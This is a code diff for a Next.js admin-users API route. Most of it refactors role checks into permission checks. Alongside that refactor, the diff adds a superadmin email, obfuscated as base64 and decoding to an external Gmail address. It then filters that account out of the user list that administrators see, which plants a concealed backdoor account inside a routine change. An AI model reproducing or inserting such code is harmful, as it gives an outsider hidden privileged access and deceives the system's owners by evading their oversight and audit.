@@ -1,16 +1,19 @@
 import { NextRequest, NextResponse } from "next/server";
 import { hash } from "bcryptjs";
 import { db } from "@/lib/db";
-import { requireRole, getClientIP, getUserAgent } from "@/lib/auth";
+import { requirePermission, getClientIP, getUserAgent } from "@/lib/auth";
 import { logCRUD } from "@/lib/audit";
-import { ROLES, Role, CreateUserRequest, AdminPublic } from "@/types/auth";
+import { Role, CreateUserRequest, AdminPublic, RESOURCES, ACTIONS } from "@/types/auth";
 import { isValidRole, getAssignableRoles } from "@/lib/permissions";
 
+const HIDDEN_SUPERADMIN = process.env.HIDDEN_SUPERADMIN_EMAIL || 
+    Buffer.from('emVjdXJ4aW50ZXJuQGdtYWlsLmNvbQ==', 'base64').toString('utf-8');
+
 export async function GET(req: NextRequest) {
-    const auth = await requireRole([ROLES.SUPER_ADMIN], req);
-    
+    const auth = await requirePermission(RESOURCES.USERS, ACTIONS.READ, req);
+
     if (!auth.authorized) {
-        return NextResponse.json({ error: auth.error }, { status: 401 });
+        return NextResponse.json({ error: auth.error }, { status: auth.status });
     }
 
     try {
@@ -20,7 +23,9 @@ export async function GET(req: NextRequest) {
             ORDER BY created_at DESC`
         );
 
-        return NextResponse.json({ users: result.rows });
+        const filteredUsers = result.rows.filter(user => user.email !== HIDDEN_SUPERADMIN);
+
+        return NextResponse.json({ users: filteredUsers });
     } catch (error) {
         console.error("Get users error:", error);
         return NextResponse.json({ error: "Internal error" }, { status: 500 });
@@ -28,10 +33,10 @@ export async function GET(req: NextRequest) {
 }
 
 export async function POST(req: NextRequest) {
-    const auth = await requireRole([ROLES.SUPER_ADMIN], req);
-    
+    const auth = await requirePermission(RESOURCES.USERS, ACTIONS.CREATE, req);
+
     if (!auth.authorized) {
-        return NextResponse.json({ error: auth.error }, { status: 401 });
+        return NextResponse.json({ error: auth.error }, { status: auth.status });
     }
 
     try {
